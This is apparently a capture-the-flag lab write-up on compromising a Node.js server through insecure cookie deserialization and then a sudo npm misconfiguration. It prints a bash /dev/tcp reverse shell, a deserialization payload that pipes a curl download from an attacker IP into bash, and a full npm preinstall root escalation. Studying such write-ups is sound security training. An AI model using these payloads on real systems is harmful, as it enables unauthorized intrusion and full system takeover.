Introduction
In this project, I conducted a security assessment of a target system running a Node.js web application. The goal was to identify vulnerabilities, gain initial access, escalate privileges, and retrieve two key flags: user.txt and root.txt.

Key Findings:
Insecure Deserialization in a Node.js web app leading to Remote Code Execution (RCE).

Misconfigured Sudo Permissions allowing privilege escalation via npm.

Methodology
1. Reconnaissance
I began with port scanning using nmap to identify exposed services:

bash
nmap -Pn -sVC -A -p- TARGET IP
Discovered Services:

22/tcp – SSH (not exploited)

80/tcp – Node.js web server (primary attack surface)

2. Web Application Analysis
The web application had an email submission form. Upon submitting test data, the server returned a base64-encoded cookie containing:

json
{"email":"test@test.com"}
This suggested insecure deserialization in Node.js, a known security risk.

3. Exploitation (Node.js Deserialization → RCE)
Hosted a reverse shell payload (shell.sh) on my server:

bash
#!/bin/bash
bash -i >& /dev/tcp/MY IP/1234 0>&1
Crafted a malicious cookie using Node.js deserialization:

javascript
_$$ND_FUNC$$_function (){ require('child_process').exec('curl http://<MY_IP>/shell.sh | bash'); }()
Sent the payload via cookie manipulation, triggering reverse shell access.

4. Initial Access & User Flag
After stabilizing the shell (python3 -c 'import pty; pty.spawn("/bin/bash")'), I located the user flag:

cat /home/dylan/user.txt
Flag: 0ba48780dee9f5677a4461f588af*****

5. Privilege Escalation (via npm Sudo Misconfiguration)
Running sudo -l revealed:

bash
User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
Using GTFOBins, I executed:

bash
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo -u root /usr/bin/npm -C $TF --unsafe-perm i
This granted root access, allowing retrieval of the final flag:

bash
cat /root/root.txt
Flag: 2cd5a9fd3a0024bfa98d01d692******

 Conclusion 
Summary of Exploits:
Insecure Deserialization → Remote Code Execution.
Excessive Sudo Privileges → Privilege Escalation via npm.
Final Notes
This project demonstrated how minor misconfigurations can lead to full system compromise. Proper security hardening could have prevented both initial access and privilege escalation.
